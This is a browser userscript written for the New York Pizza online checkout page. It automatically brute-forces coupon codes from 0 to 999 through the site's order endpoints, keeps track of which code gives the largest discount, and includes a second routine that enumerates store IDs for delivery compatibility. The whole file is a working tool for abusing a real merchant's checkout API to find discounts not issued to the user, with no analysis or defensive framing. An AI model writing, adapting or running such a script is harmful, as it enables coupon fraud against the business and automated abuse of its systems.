// ==UserScript==
// @name         New Userscript
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  try to take over the world!
// @author       You
// @match        https://www.newyorkpizza.nl/secure/checkout
// @grant        none
// ==/UserScript==

var results = [];

var nietBoeiend = ["CouponCanNotBeUsedInCombinationWithStore", "CouponCodeDoesNotExist"];
var oldDisc = 0;

function myRefreshPromotionBlock(code) {
    var activeTab = $('#checkout-promotion-container .nyp-tab-navigation li.active').find('a').data('tab');
    
    //console.log("refresh promotion block");

    $.get("/Checkout/_PromotionPartial/", function (html) {
        $('#checkout-promotion-container').html(html);
        //initPromotionBlock();
        tabs('#checkout-promotion-container');

        // Check which tab was active and make it active again
        if (activeTab) {
            openTab('#checkout-promotion-container', activeTab);
        }
        myRemoveCoupon(code);
    });
}

function myRemoveCoupon(code) {
    var identifier = $(".remove-coupon").attr("data-coupon-identifier");
    
    // check the current discount
    var discount = parseInt($(".nyp-discount-decoration").html().match(/[0-9]+/));
    if(discount >= oldDisc){
        console.log("new highest: "+discount+" code: "+(code-1));
        oldDisc = discount;
    }
    //console.log("code: "+(code-1)+" discount: "+discount);
    
    //console.log("removing coupon: "+identifier);
    
    var options = {};
    options.url = "/Order/RemoveCouponFromCurrentOrder";
    options.type = "POST";
    options.data = { couponIdentifier: identifier, alsoRemoveProducts: false };
    options.success = function (data) {
        mySetCoupon(code);
    };
    $.ajax(options);
}

function mySetCoupon(code) {
    if(code > 999 ){
        console.log("done");
        return;
    }
    
    var options = {};
    options.url = "/CheckOut/AddCouponCodeToCurrentOrder";
    options.type = "POST";
    options.data = { couponCode: code };
    options.success = function (data) {
        if (data.succeeded) {
            results.push([code, "succes"]);
            //results[code] = "succes";
            //console.log("succes: "+code);
            myRefreshPromotionBlock(code+1);
            //mySetCoupon(code+1);
        } else {
            //hideAllCouponWarningMessages();
            //return data.error;
            if(nietBoeiend.indexOf(data.error) == -1){
                //console.log("error["+code+"]: "+data.error);
            }
            //console.log("error["+code+"]: "+data.error);
            mySetCoupon(code+1);
        }
    };
    $.ajax(options);
}

function resetAdress() {
    changeAddressOnOrder("","","","","","",false);
}

function checkCodeCompat(code){
    data = { deliveryType: 1, storeId: code, removeIncompatibleCoupons: false };
    
    $.post('/Order/SetDeliveryTypeCurrentOrder/', data,
        function (data) {
            if (data.succeeded) {
                console.log("yes compat id: "+code);
            } else {
                //console.log("not compat id:"+code);
            }
        if(code < 200){
            checkCodeCompat(code+1);
        }
        },
    "json");
}

(function() {
    'use strict';
    // Your code here...
    
    console.log("started posting...");
    mySetCoupon(0);
    //checkCodeCompat(0);
})();
